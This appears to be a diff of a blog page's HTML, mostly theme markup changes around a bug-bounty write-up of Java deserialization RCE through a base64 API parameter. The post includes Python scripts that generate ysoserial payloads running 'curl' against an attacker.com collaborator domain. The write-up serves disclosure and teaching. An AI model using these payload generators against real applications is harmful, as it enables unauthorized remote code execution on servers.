@@ -10,23 +10,29 @@
 Reconnaissance In this step, my recon methodology was not finding some unique subdomains or assets. I was searching for some web applications with some interesting features such as login or file upload." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
+
 <link rel="canonical" href="/posts/the-story-of-a-rce-on-a-java-web-application/" />
 
 
 
 
-<link rel="stylesheet" href="/assets/style.css">
-
-  <link rel="stylesheet" href="/assets/green.css">
 
 
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
 
 
 
 
-<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
 
-  <link rel="shortcut icon" href="/img/favicon/green.png">
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
 
 
 
@@ -51,8 +57,8 @@ Reconnaissance In this step, my recon methodology was not finding some unique su
     <meta property="og:image" content="/img/favicon/green.png">
   
 
-<meta property="og:image:width" content="2048">
-<meta property="og:image:height" content="1024">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
 
 
   <meta property="article:published_time" content="2022-01-27 08:56:39 &#43;0330 &#43;0330" />
@@ -85,12 +91,42 @@ Reconnaissance In this step, my recon methodology was not finding some unique su
 
     </div>
     
-      <div class="menu-trigger">menu</div>
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://medium.com/@LIL__NIX">Medium</a></li>
+        
+      
+        
+          <li><a href="/index.xml">RSS</a></li>
+        
+      
+        
+          <li><a href="https://twitch.tv/thelilnix">Twitch</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/thelilnix">Twitter</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
     
   </div>
   
-    <nav class="menu">
-  <ul class="menu__inner menu__inner--desktop">
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
     
       
         
@@ -106,41 +142,14 @@ Reconnaissance In this step, my recon methodology was not finding some unique su
         
       
         
-          <li><a href="https://twitch.tv/lil__nix">Twitch</a></li>
+          <li><a href="https://twitch.tv/thelilnix">Twitch</a></li>
         
       
         
-          <li><a href="https://twitter.com/Lil__Nix">Twitter</a></li>
+          <li><a href="https://twitter.com/thelilnix">Twitter</a></li>
         
       
       
-    
-
-    
-  </ul>
-
-  <ul class="menu__inner menu__inner--mobile">
-    
-      
-        <li><a href="/about">About</a></li>
-      
-    
-      
-        <li><a href="https://medium.com/@LIL__NIX">Medium</a></li>
-      
-    
-      
-        <li><a href="/index.xml">RSS</a></li>
-      
-    
-      
-        <li><a href="https://twitch.tv/lil__nix">Twitch</a></li>
-      
-    
-      
-        <li><a href="https://twitter.com/Lil__Nix">Twitter</a></li>
-      
-    
     
   </ul>
 </nav>
@@ -151,15 +160,16 @@ Reconnaissance In this step, my recon methodology was not finding some unique su
 
   <div class="content">
     
-<div class="post">
+<article class="post">
   <h1 class="post-title">
-    <a href="/posts/the-story-of-a-rce-on-a-java-web-application/">The Story of an RCE on a Java Web Application</a></h1>
+    <a href="/posts/the-story-of-a-rce-on-a-java-web-application/">The Story of an RCE on a Java Web Application</a>
+  </h1>
   <div class="post-meta">
     
-      <span class="post-date">
-        2022-01-27
+      <time class="post-date">
+        2022-01-27 ::
         
-      </span>
+      </time>
     
     
     
@@ -178,7 +188,7 @@ Reconnaissance In this step, my recon methodology was not finding some unique su
 <p>In the following, I had to recon the portal itself for learning its functionalities. As a normal routine, I tried to use the web application as a normal user (If you don’t understand the normal flow of the application, you can’t break it). I wrote down important things and then opened Burp.</p>
 <h2 id="discovery">Discovery<a href="#discovery" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>I was attracted to the portal because it was custom, this kind of portals, CMSes, or forums are often more vulnerable than public versions (like WordPress). While capturing the requests in Burp, I was testing the sections until I reached a page that contained a list, when I scrolled that, Java Script sent an Ajax request for loading more rows. The request was something like this:</p>
-<pre><code>https://target.com/api/v1/list?size=25&amp;after=rO0aTm90aGluZyBIZXJlIDovIEp1c3QgYSBzZXJpYWxpemVkIHZhbHVlCg==
+<pre tabindex="0"><code>https://target.com/api/v1/list?size=25&amp;after=rO0aTm90aGluZyBIZXJlIDovIEp1c3QgYSBzZXJpYWxpemVkIHZhbHVlCg==
 </code></pre><p><img src="/img/screen1.png" alt="The request"></p>
 <p>The first thing I tried was decoding <code>after</code> parameter value (as you know, it’s a base64). It had a binary value but some characters decoded successfully:</p>
 <p><img src="/img/screen2.png" alt="Decoded Content"></p>
@@ -190,7 +200,7 @@ Reconnaissance In this step, my recon methodology was not finding some unique su
 <p><img src="/img/screen3.png" alt="Img: geeksforgeeks.com"></p>
 <h2 id="the-vulnerability">The Vulnerability<a href="#the-vulnerability" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>As I mentioned before, after decoding the serialized value, I started researching deserialization in Java (although I was never interested in white-box stuff, I also researched the serialization functions in Java :) ). As the result of the research, I learned we can give a serialized input in different formats, for example:</p>
-<pre><code>Hex signature      -&gt;   AC ED 00 05
+<pre tabindex="0"><code>Hex signature      -&gt;   AC ED 00 05
 Base64 signature   -&gt;   rO0
 </code></pre><p>The target is using base64, so we have to find a way for creating our malicious serialized input for RCE but before that, we should make sure the target is vulnerable. Here I had two ways: 1. Writing a PoC code in Java (I didn’t know Java ) 2. Using available PoC codes in public. I was pretty sure the second way was much better for me (although I didn’t want to be a script-kiddie). So I started searching for some PoC codes in GitHub and found <a href="https://github.com/frohoff/ysoserial">ysoserial</a>. This tool generates various payloads according to the functions or versions, one of these payloads is <em>URLDNS</em>, you can give it a URL and it generates a payload. The program is vulnerable if we give that the generated payload and get a DNS query from the server. In other words, I had to do an out-of-band test to make sure the application is vulnerable. I generated the payload and gave it to the web application and … :</p>
 <p><img src="/img/screen4.png" alt="DNS Query"></p>
@@ -198,44 +208,44 @@ Base64 signature   -&gt;   rO0
 <h2 id="exploit">Exploit<a href="#exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>I was sure I could exploit it but there was a problem. I used ysoserial again but I was shocked because it didn’t work (At least I didn’t find any suitable payload). I gave up and started hunting for other bugs on the portal.</p>
 <p>After 2-3 weeks, I decided to work on it again. Like before, I had to ways: 1. Writing an exploit code for RCE in Java 2. Finding an exploit code in GitHub (or anywhere). I chose the second way (there’s often an exploit code). This time I found some ysoserial forks with some additional payloads/options. I couldn’t test these payloads manual (they were too much). So I wrote a python script to generate all the possible payloads and save them in a file. Then I gave that file to <strong>Burp Intruder</strong> but again, didn’t work. The final version of the script was something like this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
-
-modes <span style="color:#f92672">=</span> [] <span style="color:#75715e"># All payload names here</span>
-
-collab <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;attacker.com&#34;</span>
-payload <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#34;curl -s https://rce.{collab}/poc&#34;</span>
-
-<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">6</span>):
-
-    <span style="color:#66d9ef">for</span> mode <span style="color:#f92672">in</span> modes:
-            result <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;java -jar ysoserial&#39;</span> <span style="color:#f92672">+</span> f<span style="color:#e6db74">&#34;{i}&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.jar &#39;</span> <span style="color:#f92672">+</span> mode <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#34;&#39;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34; | base64 -w 0&#39;</span>)<span style="color:#f92672">.</span>read()
-
-    <span style="color:#66d9ef">if</span> result <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>:
-            <span style="color:#66d9ef">print</span>(result)
-    <span style="color:#66d9ef">else</span>:
-            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Donno but something is going wrong :/&#34;</span>)
-</code></pre></div><h2 id="the-second-try">The Second Try<a href="#the-second-try" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>modes <span style="color:#f92672">=</span> [] <span style="color:#75715e"># All payload names here</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>collab <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;attacker.com&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;curl -s https://rce.</span><span style="color:#e6db74">{</span>collab<span style="color:#e6db74">}</span><span style="color:#e6db74">/poc&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">6</span>):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> mode <span style="color:#f92672">in</span> modes:
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;java -jar ysoserial&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.jar &#39;</span> <span style="color:#f92672">+</span> mode <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#34;&#39;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34; | base64 -w 0&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> result <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>:
+</span></span><span style="display:flex;"><span>            print(result)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Donno but something is going wrong :/&#34;</span>)
+</span></span></code></pre></div><h2 id="the-second-try">The Second Try<a href="#the-second-try" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>When I didn’t get any request from the target, I kind of gave up but I took a look at the responses. Some status codes were 400 or some other responses contained a Java error. With some troubleshooting, I noticed some characters in base64 break the request (e.g. <code>+</code>). So I had to modify my python script and URL encode the payloads before saving them. For the second time, I gave the new wordlist to my Burp Intruder and after a few seconds:</p>
 <p><img src="/img/screen5.png" alt="Curl"></p>
 <p>This means I was able to execute my commands on the server (RCE). After finding the correct payload and the correct ysoserial fork, I wrote an exploit code in Python for easier reproducing:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
-<span style="color:#f92672">import</span> urllib.parse
-
-mode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;THAT_FOUNDED_SUITABLE_MODE&#34;</span>
-
-collab <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter your collaborator domain (e.g. attacker.com)&gt; &#34;</span>)
-payload <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#34;curl -s https://{collab}/poc&#34;</span>
-
-result <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;java -jar ysoserial4.jar &#39;</span> <span style="color:#f92672">+</span> mode <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#34;&#39;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34; | base64 -w0&#39;</span>)<span style="color:#f92672">.</span>read()
-
-encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(result)
-
-<span style="color:#66d9ef">if</span> encoded <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>:
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Copy the following payload:</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>)
-    <span style="color:#66d9ef">print</span>(encoded)
-<span style="color:#66d9ef">else</span>:
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Donno but something is going wrong :/&#34;</span>)
-</code></pre></div><p>Finally, I created <code>/tmp/poc.txt</code> and reported the vulnerability. For PoC, this would be enough.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;THAT_FOUNDED_SUITABLE_MODE&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>collab <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter your collaborator domain (e.g. attacker.com)&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;curl -s https://</span><span style="color:#e6db74">{</span>collab<span style="color:#e6db74">}</span><span style="color:#e6db74">/poc&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;java -jar ysoserial4.jar &#39;</span> <span style="color:#f92672">+</span> mode <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#34;&#39;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34; | base64 -w0&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(result)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> encoded <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Copy the following payload:</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(encoded)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Donno but something is going wrong :/&#34;</span>)
+</span></span></code></pre></div><p>Finally, I created <code>/tmp/poc.txt</code> and reported the vulnerability. For PoC, this would be enough.</p>
 <h2 id="lessons-learned">Lessons Learned<a href="#lessons-learned" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <ul>
 <li>Always decode any base64 or other encoded texts.</li>
@@ -256,7 +266,7 @@ encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.
       </div></div>
 
   
-  
+    
 <div class="pagination">
     <div class="pagination__title">
         <span class="pagination__title-h">Read other posts</span>
@@ -278,8 +288,10 @@ encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.
   
 
   
+    
 
-</div>
+  
+</article>
 
   </div>
 
@@ -290,15 +302,17 @@ encoded <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.
       <div class="copyright copyright--user">
         <span>© LILNIX</span>
     
-        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
       </div>
   </div>
 </footer>
 
-<script src="/assets/main.js"></script>
-<script src="/assets/prism.js"></script>
 
 
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
 
 
 
